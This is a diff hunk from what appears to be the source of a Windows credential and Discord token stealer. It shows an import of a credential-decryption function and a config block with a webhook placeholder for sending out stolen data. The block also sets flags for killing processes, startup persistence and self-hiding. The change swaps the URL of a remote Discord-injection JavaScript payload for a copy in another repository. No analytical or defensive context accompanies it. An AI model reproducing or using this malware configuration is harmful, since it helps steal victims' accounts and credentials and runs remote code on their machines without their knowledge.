@@ -21,7 +21,7 @@ from win32crypt import CryptUnprotectData
 
 config = {
     'webhook': "WEBHOOK_HERE",
-    'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
+    'injection_url': "https://raw.githubusercontent.com/KRONIKER-KNK/Discord-Injection/main/injection.js",
     'kill_processes': True,
     'startup': True,
     'hide_self': True,
